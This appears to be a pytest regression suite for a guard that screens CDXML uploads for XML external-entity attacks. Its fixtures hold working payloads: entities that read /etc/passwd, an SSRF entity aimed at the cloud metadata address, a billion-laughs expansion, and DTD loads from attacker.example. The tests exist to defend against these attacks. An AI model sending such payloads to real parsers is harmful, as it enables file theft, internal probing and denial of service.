"""Regression tests for the defensive XML / XXE guard (SEC C-01).

The upstream Java CDXMLReader is not hardened against XXE, SSRF, or
billion-laughs DoS. The Python-side guard in
:mod:`app.services.xml_guard` rejects unsafe CDXML payloads at the
format-detection boundary, before bytes reach the JVM.

These tests exercise the guard directly AND through the public
``detect_format`` entry point so every CDXML code path (extract,
reactions, batch, celery tasks) is covered.
"""

from __future__ import annotations

import pytest

from app.errors import FormatDetectionError
from app.services.format_detector import detect_format
from app.services.xml_guard import reject_xml_external_entities


BENIGN_CDXML = (
    b'<?xml version="1.0"?>\n'
    b"<CDXML><page><fragment>C</fragment></page></CDXML>"
)

ALLOWED_DOCTYPE_CDXML = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML SYSTEM "cdxml.dtd">\n'
    b"<CDXML><page><fragment>C</fragment></page></CDXML>"
)


# ---------------------------------------------------------------------------
# Safe payloads — must pass both the direct guard and detect_format
# ---------------------------------------------------------------------------


def test_benign_cdxml_accepted() -> None:
    # No exception should be raised.
    reject_xml_external_entities(BENIGN_CDXML)
    assert detect_format(BENIGN_CDXML) == "cdxml"


def test_allowed_doctype_cdxml_accepted() -> None:
    reject_xml_external_entities(ALLOWED_DOCTYPE_CDXML)
    assert detect_format(ALLOWED_DOCTYPE_CDXML) == "cdxml"


def test_utf8_bom_prefixed_benign_cdxml_accepted() -> None:
    payload = b"\xef\xbb\xbf" + BENIGN_CDXML
    # detect_format strips the BOM; the guard runs on the pre-strip bytes
    # (conservative) and still accepts — no DOCTYPE, no ENTITY.
    assert detect_format(payload) == "cdxml"


def test_cdx_binary_never_reaches_xml_guard() -> None:
    # Binary CDX starts with VjCD — guard must not be invoked. If it were
    # invoked on arbitrary binary, random byte sequences could trip false
    # positives.
    fake_cdx = b"VjCD" + b"\x00" * 64 + b"<!DOCTYPE evil SYSTEM 'file:///'>"
    # Binary CDX short-circuits before hitting xml_guard in detect_format.
    assert detect_format(fake_cdx) == "cdx"


# ---------------------------------------------------------------------------
# XXE — file-read attack
# ---------------------------------------------------------------------------


XXE_FILE_READ = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML [\n'
    b'  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    b']>\n'
    b"<CDXML><page><fragment>&xxe;</fragment></page></CDXML>"
)


def test_xxe_file_read_rejected_directly() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(XXE_FILE_READ)


def test_xxe_file_read_rejected_via_detect_format() -> None:
    with pytest.raises(FormatDetectionError):
        detect_format(XXE_FILE_READ)


# ---------------------------------------------------------------------------
# SSRF attack — ENTITY pointing at internal network
# ---------------------------------------------------------------------------


XXE_SSRF = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML [\n'
    b'  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n'
    b']>\n'
    b"<CDXML><page/></CDXML>"
)


def test_xxe_ssrf_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(XXE_SSRF)


# ---------------------------------------------------------------------------
# Billion laughs / quadratic blowup — purely internal ENTITY refs
# ---------------------------------------------------------------------------


BILLION_LAUGHS = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE lolz [\n'
    b'  <!ENTITY lol "lol">\n'
    b'  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
    b'  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n'
    b']>\n'
    b"<CDXML><page>&lol2;</page></CDXML>"
)


def test_billion_laughs_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(BILLION_LAUGHS)


# ---------------------------------------------------------------------------
# Parameter entity variation (used for blind-exfil channels)
# ---------------------------------------------------------------------------


PARAM_ENTITY = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML [\n'
    b'  <!ENTITY % p SYSTEM "http://attacker.example/xxe.dtd">\n'
    b'  %p;\n'
    b']>\n'
    b"<CDXML><page/></CDXML>"
)


def test_parameter_entity_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(PARAM_ENTITY)


# ---------------------------------------------------------------------------
# Case-insensitivity — upper / mixed case keywords must not slip through
# ---------------------------------------------------------------------------


CASE_MIXED = (
    b'<?xml version="1.0"?>\n'
    b'<!doctype CDXML [\n'
    b'  <!eNtItY xxe SYSTEM "file:///etc/hostname">\n'
    b']>\n'
    b"<CDXML/>"
)


def test_mixed_case_keywords_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(CASE_MIXED)


# ---------------------------------------------------------------------------
# DOCTYPE with SYSTEM id other than cdxml.dtd — rejected
# ---------------------------------------------------------------------------


UNKNOWN_SYSTEM_ID = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML SYSTEM "http://attacker.example/evil.dtd">\n'
    b"<CDXML/>"
)


def test_unknown_system_id_rejected() -> None:
    with pytest.raises(FormatDetectionError) as exc_info:
        reject_xml_external_entities(UNKNOWN_SYSTEM_ID)
    assert "cdxml.dtd" in str(exc_info.value)


# ---------------------------------------------------------------------------
# PUBLIC identifier — also rejected (browsers / old parsers may still fetch)
# ---------------------------------------------------------------------------


PUBLIC_ID = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML PUBLIC "-//Attacker//DTD//EN" '
    b'"http://attacker.example/evil.dtd">\n'
    b"<CDXML/>"
)


def test_public_id_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(PUBLIC_ID)


# ---------------------------------------------------------------------------
# Bounded head scan — a malicious payload padding garbage into the scan
# window cannot bypass detection because DOCTYPE MUST appear before the
# root element. We verify by placing the DOCTYPE late in a padded prolog
# but still within the 64 KB scan window.
# ---------------------------------------------------------------------------


def test_doctype_deep_in_prolog_still_caught() -> None:
    pad = b" " * 50_000
    payload = (
        b'<?xml version="1.0"?>\n'
        + b"<!-- " + pad + b" -->\n"
        + b'<!DOCTYPE CDXML [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        + b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


# ---------------------------------------------------------------------------
# Performance — the guard runs in bounded time regardless of file size.
# ---------------------------------------------------------------------------


def test_guard_performance_bounded() -> None:
    """A 50 MB garbage payload must not take noticeable CPU in the guard."""
    import time

    big = (
        b'<?xml version="1.0"?>\n<CDXML>'
        + (b"X" * (50 * 1024 * 1024))
        + b"</CDXML>"
    )
    t0 = time.perf_counter()
    reject_xml_external_entities(big)
    elapsed = time.perf_counter() - t0
    # Slack bound — the guard should complete in under 50 ms even on a
    # slow runner because the scan window is capped at 64 KB.
    assert elapsed < 0.2, f"xml_guard took {elapsed * 1000:.1f} ms"
